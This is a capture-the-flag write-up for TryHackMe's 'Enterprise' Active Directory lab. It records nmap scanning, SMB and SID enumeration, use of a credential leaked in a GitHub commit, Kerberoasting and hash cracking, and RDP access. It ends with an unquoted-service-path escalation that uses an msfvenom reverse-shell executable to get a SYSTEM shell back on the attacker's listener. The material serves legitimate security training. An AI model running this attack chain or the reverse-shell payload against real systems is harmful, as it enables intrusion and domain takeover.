# **Enterprise - TryHackMe**

*Target Ip. Address : 10.48.183.111*

This is a hard Active Directory challenge. Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.48.183.111
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 10:07 +0545
Nmap scan report for 10.48.183.111
Host is up (0.054s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-07 04:22:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Not valid before: 2026-02-06T04:19:59
|_Not valid after:  2026-08-08T04:19:59
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2026-02-07T04:22:22+00:00
|_ssl-date: 2026-02-07T04:22:30+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-07T04:22:22
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.36 seconds
```

That's lots of info. Before that let's add the Domain name and Computer Name in our hosts file.

```bash
kali@kali:cat /etc/hosts                                                                                                                        
10.48.183.111   LAB-DC.LAB.ENTERPRISE.THM LAB.ENTERPRISE.THM

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

I tried some enumeration on the website on port 80, but it was a dead end. 

Since, there is smb server. Let's see if we have guest logon allowed.

```bash
kali@kali:smbclient -L \\10.48.183.111                                                                                                          
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Docs            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      Users Share. Do Not Touch!
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.48.183.111 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Ok. We have guest logon allowed. Let's see what do we have in Users share. 

```bash
kali@kali:smbclient \\\\10.48.183.111\\Users                                                                                                    
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Mar 12 07:56:49 2021
  ..                                 DR        0  Fri Mar 12 07:56:49 2021
  Administrator                       D        0  Fri Mar 12 03:40:48 2021
  All Users                       DHSrn        0  Sat Sep 15 13:13:48 2018
  atlbitbucket                        D        0  Fri Mar 12 04:38:06 2021
  bitbucket                           D        0  Fri Mar 12 07:56:51 2021
  Default                           DHR        0  Fri Mar 12 06:03:03 2021
  Default User                    DHSrn        0  Sat Sep 15 13:13:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 13:01:48 2018
  LAB-ADMIN                           D        0  Fri Mar 12 06:13:14 2021
  Public                             DR        0  Fri Mar 12 03:12:02 2021

                15587583 blocks of size 4096. 9936308 blocks available
smb: \> cd "All Users"
cd \All Users\: NT_STATUS_STOPPED_ON_SYMLINK
smb: \> cd bitbucket
smb: \bitbucket\> ls
NT_STATUS_ACCESS_DENIED listing \bitbucket\*
```

It was just a decoy to lure us. Nothing can be done from here.

Since, we have guest logon. Let's try to bruteforce the Users in the domain.

```bash
kali@kali:impacket-lookupsid guest@10.48.183.111                                                                                                
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.48.183.111
[*] StringBinding ncacn_np:10.48.183.111[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2168718921-3906202695-65158103
500: LAB-ENTERPRISE\Administrator (SidTypeUser)
501: LAB-ENTERPRISE\Guest (SidTypeUser)
502: LAB-ENTERPRISE\krbtgt (SidTypeUser)
512: LAB-ENTERPRISE\Domain Admins (SidTypeGroup)
513: LAB-ENTERPRISE\Domain Users (SidTypeGroup)
514: LAB-ENTERPRISE\Domain Guests (SidTypeGroup)
515: LAB-ENTERPRISE\Domain Computers (SidTypeGroup)
516: LAB-ENTERPRISE\Domain Controllers (SidTypeGroup)
517: LAB-ENTERPRISE\Cert Publishers (SidTypeAlias)
520: LAB-ENTERPRISE\Group Policy Creator Owners (SidTypeGroup)
521: LAB-ENTERPRISE\Read-only Domain Controllers (SidTypeGroup)
522: LAB-ENTERPRISE\Cloneable Domain Controllers (SidTypeGroup)
525: LAB-ENTERPRISE\Protected Users (SidTypeGroup)
526: LAB-ENTERPRISE\Key Admins (SidTypeGroup)
553: LAB-ENTERPRISE\RAS and IAS Servers (SidTypeAlias)
571: LAB-ENTERPRISE\Allowed RODC Password Replication Group (SidTypeAlias)
572: LAB-ENTERPRISE\Denied RODC Password Replication Group (SidTypeAlias)
1000: LAB-ENTERPRISE\atlbitbucket (SidTypeUser)
1001: LAB-ENTERPRISE\LAB-DC$ (SidTypeUser)
1102: LAB-ENTERPRISE\DnsAdmins (SidTypeAlias)
1103: LAB-ENTERPRISE\DnsUpdateProxy (SidTypeGroup)
1104: LAB-ENTERPRISE\ENTERPRISE$ (SidTypeUser)
1106: LAB-ENTERPRISE\bitbucket (SidTypeUser)
1107: LAB-ENTERPRISE\nik (SidTypeUser)
1108: LAB-ENTERPRISE\replication (SidTypeUser)
1109: LAB-ENTERPRISE\spooks (SidTypeUser)
1110: LAB-ENTERPRISE\korone (SidTypeUser)
1111: LAB-ENTERPRISE\banana (SidTypeUser)
1112: LAB-ENTERPRISE\Cake (SidTypeUser)
1113: LAB-ENTERPRISE\Password-Policy-Exemption (SidTypeGroup)
1114: LAB-ENTERPRISE\Contractor (SidTypeGroup)
1115: LAB-ENTERPRISE\sensitive-account (SidTypeGroup)
1116: LAB-ENTERPRISE\contractor-temp (SidTypeUser)
1117: LAB-ENTERPRISE\varg (SidTypeUser)
1118: LAB-ENTERPRISE\adobe-subscription (SidTypeGroup)
1119: LAB-ENTERPRISE\joiner (SidTypeUser)
```

Let's add the usernames on a text file.

```bash
kali@kali:cat user.txt
atlbitbucket
bitbucket
nik
spooks
korone
banana
Cake
varg
joiner
```

Let's see if any of the users have No_preauth set.

```bash
kali@kali:impacket-GetNPUsers lab.enterprise.thm/ -usersfile user.txt -no-pass -dc-ip 10.48.183.111                                             
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User atlbitbucket doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bitbucket doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nik doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User spooks doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User korone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User banana doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Cake doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User varg doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User joiner doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Unlucky !!! Well, this is a hard challenge after all. I tried some enumeration, and was feeling like something was missing.

So, I did a full port scan, to see if I missed anything.

```bash
kali@kali:nmap -p- 10.48.183.111
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 10:25 +0545
Nmap scan report for LAB-DC.LAB.ENTERPRISE.THM (10.48.183.111)
Host is up (0.046s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
7990/tcp  open  unknown
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown                                                                                                                   
49666/tcp open  unknown                                                                                                                   
49669/tcp open  unknown                                                                                                                   
49670/tcp open  unknown                                                                                                                   
49671/tcp open  unknown                                                                                                                   
49673/tcp open  unknown                                                                                                                   
49677/tcp open  unknown                                                                                                                   
49700/tcp open  unknown                                                                                                                   
49704/tcp open  unknown                                                                                                                   
49879/tcp open  unknown                                                                                                                   
                                                                                                                                          
Nmap done: 1 IP address (1 host up) scanned in 69.06 seconds
```

Among all these scan, 7990 port stand out, as it was not found on previous scan, and it's service is unknow. Let's dive deeper.

```bash
kali@kali:nmap -p 7990 -sV -sC  10.48.183.111                                                                                                   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 10:27 +0545
Nmap scan report for LAB-DC.LAB.ENTERPRISE.THM (10.48.183.111)
Host is up (0.051s latency).

PORT     STATE SERVICE VERSION
7990/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Log in to continue - Log in with Atlassian account
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.32 seconds
```

It is Microsoft IIS site of Atlassian.

Let's see if it leads us anywhere.

<img width="489" height="801" alt="image" src="https://github.com/user-attachments/assets/ac300754-d5e2-48a1-8873-e96cb3ece25e" />

There is a hint that, they are moving to github. Let's see if there are any projects/repositories.

<img width="1105" height="791" alt="image" src="https://github.com/user-attachments/assets/2c32273d-af98-4518-b1ed-6afefe5e8c84" />

We find a github organization account with the same logo as this room challenge.

There is only person in this oranization, Nik-enterprise-dev. Let's see what we have in his profile.

<img width="1107" height="811" alt="image" src="https://github.com/user-attachments/assets/a78237b4-aaea-491c-ac4c-46a68d76ea02" />

There is a project called mgmtScript.ps1, with 2 commits. Let' see if he had some secrets on those commits.

<img width="1100" height="757" alt="image" src="https://github.com/user-attachments/assets/84a2a992-8412-44f6-8398-3970a7709c72" />

Finally, at least something. We have a credentials for use nik.

```credentials
$userName = 'nik'
$userPassword = 'To...i!'
```

Now, since we have valid credentails. Lets' try Kerberoasting.

```bash
kali@kali:impacket-GetUserSPNs lab.enterprise.thm/nik:'To...i!' -dc-ip 10.48.183.111 -request                                                
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 07:05:01.333272  2021-04-26 21:01:41.570158             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$lab.enterprise.thm/bitbucket*$04fd543.....d7c8e7f5
```

We finally have a Kerberos TGS hash for user bitbucket.

Let's crack it and move forward.

```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
li...et  (?)     
1g 0:00:00:00 DONE (2026-02-07 11:29) 1.315g/s 2066Kp/s 2066Kc/s 2066KC/s livelife93..liss27
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We cracked the hash, let's see if we can rdp as bitbucket with this password.

```bash
kali@kali:nxc rdp 10.48.183.111 -u 'bitbucket' -p 'li...et'                                                                             
RDP         10.48.183.111   3389   LAB-DC           [*] Windows 10 or Windows Server 2016 Build 17763 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (nla:False)
RDP         10.48.183.111   3389   LAB-DC           [+] LAB.ENTERPRISE.THM\bitbucket:li...et (Pwn3d!)
```

Pwn3d! Nothing better than seeing this. We can rdp into the Domain Controller.

```bash
kali@kali:xfreerdp3 /u:bitbucket /p:li...et /v:10.48.183.111 /d:lab.enterprise.thm /dynamic-resolution /cert:ignore /drive:share,/home/kali/tools
```

We are also adding our attacker machine share, so that uploading and downloading get's easy.

We find our first flag at the Desktop.

<img width="1101" height="936" alt="image" src="https://github.com/user-attachments/assets/9bed5f03-8fef-4d26-8303-1b71742b3b3d" />

```flag
user.txt: THM{ed.....36}
```       

Since, we had our share mounted, we can easily copy paste from our share to the target machine.

<img width="1109" height="925" alt="image" src="https://github.com/user-attachments/assets/5dd217e2-10c9-40fc-80a3-dde0ccb72952" />

Let's run Winpeas and see if we find something interesting.

There is not more I could get, but the output pointing to unquoted service paths.
So, upload PowerUp.ps1, and search for UnquotedService.

```bash
PS C:\Users\bitbucket\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\bitbucket\Desktop> Get-UnquotedService


ServiceName    : zerotieroneservice
Path           : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'zerotieroneservice' -Path <HijackPath>
CanRestart     : True
Name           : zerotieroneservice

ServiceName    : zerotieroneservice
Path           : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'zerotieroneservice' -Path <HijackPath>
CanRestart     : True
Name           : zerotieroneservice

ServiceName    : zerotieroneservice
Path           : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\Zero Tier; IdentityReference=BUILTIN\Users;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'zerotieroneservice' -Path <HijackPath>
CanRestart     : True
Name           : zerotieroneservice

ServiceName    : zerotieroneservice
Path           : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\Zero Tier; IdentityReference=BUILTIN\Users;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'zerotieroneservice' -Path <HijackPath>
CanRestart     : True
Name           : zerotieroneservice

ServiceName    : zerotieroneservice
Path           : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\Zero Tier\Zero Tier One;
                 IdentityReference=BUILTIN\Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'zerotieroneservice' -Path <HijackPath>
CanRestart     : True
Name           : zerotieroneservice

ServiceName    : zerotieroneservice
Path           : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe;
                 IdentityReference=BUILTIN\Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'zerotieroneservice' -Path <HijackPath>
CanRestart     : True
Name           : zerotieroneservice
```

Checking permissions on Zero Tier.

```bash
PS C:\Users\bitbucket\Desktop> Get-Acl -Path "C:\Program Files (x86)\Zero Tier" | Format-List


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\Zero Tier
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Users Allow  Write, Synchronize
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  :
Sddl   : O:SYG:SYD:AI(A;OICI;0x100116;;;BU)(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CI
         IOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;
         FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;
         OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)
```

We have write access as well.
Since, this directory has a write access, and it also suffers from Unquoted Service vulnerability. We can possibly abuse this to get ourselves a reverse shell.

Create a reverse shell executable with msfvenom.

```bash
kali@kali:msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.130.26 LPORT=9001 -f exe -o Zero.exe                                         
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                   
[-] No arch selected, selecting arch: x64 from the payload                                                                               
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: Zero.exe
```

Copy that executable on Zero Tier directory.

```bash
PS C:\Program Files (x86)\Zero Tier> dir


    Directory: C:\Program Files (x86)\Zero Tier


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/14/2021   6:08 PM                Zero Tier One
-a----         2/6/2026  10:53 PM           7680 Zero.exe
```

Start a listener on attacker machine.

```bash
kali@kali:penelope -p 9001
[+] Listening for reverse shells on 0.0.0.0:9001 →  127.0.0.1 • 192.168.11.65 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Stop and start the service.

```bash
PS C:\Program Files (x86)\Zero Tier> sc.exe stop zerotieroneservice
[SC] ControlService FAILED 1062:

The service has not been started.

PS C:\Program Files (x86)\Zero Tier> sc.exe start zerotieroneservice
```

We should be receving a reverse shell shortly after.

```bash
kali@kali:penelope -p 9001
[+] Listening for reverse shells on 0.0.0.0:9001 →  127.0.0.1 • 192.168.11.65 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from LAB-DC~10.48.183.111-Microsoft_Windows_Server_2019_Standard-x64-based_PC 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
[+] Logging to /home/kali/.penelope/sessions/LAB-DC~10.48.183.111-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_02_07-12_40_09-248.log 📜                                                                                                                              
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami
whoami
nt authority\system
```

We get a reverse shell as nt authority\system. Let's read the final flag and complete this challenge.

```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1a.....81}
```
